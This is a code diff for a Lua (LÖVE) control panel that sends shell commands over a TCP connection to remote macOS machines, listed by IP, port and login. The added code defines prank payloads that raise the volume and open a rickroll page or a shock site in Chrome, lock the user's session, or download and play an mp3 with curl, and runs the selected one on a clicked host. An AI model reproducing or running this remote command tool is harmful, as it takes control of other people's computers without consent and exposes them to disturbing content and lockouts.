@@ -65,6 +65,26 @@ function love.load()
     print(tcpSocket:receive("*l")) -- is root
     tab = {}
 
+    cmds = { "osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/'",
+        "osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://meatspin.fr/'",
+        "'/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession' -suspend",
+        "osascript -e 'set Volume 10' && say Hello",
+        "osascript -e 'set Volume 10' && curl -s 'http://instantsandstorm.com/sandstorm.mp3' > /tmp/darude.mp3 && afplay /tmp/darude.mp3",
+        "osascript -e 'set Volume 10'"
+        }
+
+    cmds_name = {
+        "rickroll",
+        "meatspin",
+        "delog",
+        "say hello",
+        "darude",
+        "sound"
+    }
+
+    mode = 0;
+    r,g,b = 0,0, 255
+
 end
 
 i = 0
@@ -99,29 +119,37 @@ function love.update(dt)
 end
 
 function love.draw()
+    love.graphics.setColor( 255, 255, 255, 255)
     drawList()
+    love.graphics.setColor( r, g, b, 255)
+    love.graphics.rectangle( 'fill', 160 * 7, 190*3, 160, 190)
+    love.graphics.setColor( 255, 255, 255, 255)
+    love.graphics.print(mode % #cmds, 160 * 7 + 5, 190*3 + 5)
+    love.graphics.print(cmds_name[mode % #cmds + 1], 160 * 7 + 5, 190*3 + 20)
+
+
 end
 
 function love.mousepressed(x, y, button)
 
     print(x,y,button)
 
-    print(math.floor(x / 160)*4 +math.floor(y / 190))
-
-    target = math.floor(x / 160)*4 +math.floor(y / 190);
-
-    id = 0
-    for k,v in pairs(tab) do
-        if id == target then
-            print("send:", v.ip, v.port, v.login)
-            if button == 'l' then
-				tmp = {ip = v.ip, port = v.port, cmd = "osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/'"}
-			elseif button == 'r'  then
-				tmp = {ip = v.ip, port = v.port, cmd = "'/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession' -suspend"}
-			end
-			tcpSocket:send("cmd:run:"..json.encode(tmp).."\n")
+    if x > (160*7) and y > (190*3) then
+        mode = mode + 1
+        mode = mode % #cmds
+    else
+        print(math.floor(x / 160)*4 +math.floor(y / 190))
+        target = math.floor(x / 160)*4 +math.floor(y / 190);
+        id = 0
+        for k,v in pairs(tab) do
+            if id == target then
+                print("send:", v.ip, v.port, v.login)
+                if button == 'l' then
+    				tmp = {ip = v.ip, port = v.port, cmd = cmds[mode + 1]}
+    			end
+    			tcpSocket:send("cmd:run:"..json.encode(tmp).."\n")
+            end
+            id = id + 1
         end
-        id = id + 1
     end
-
 end
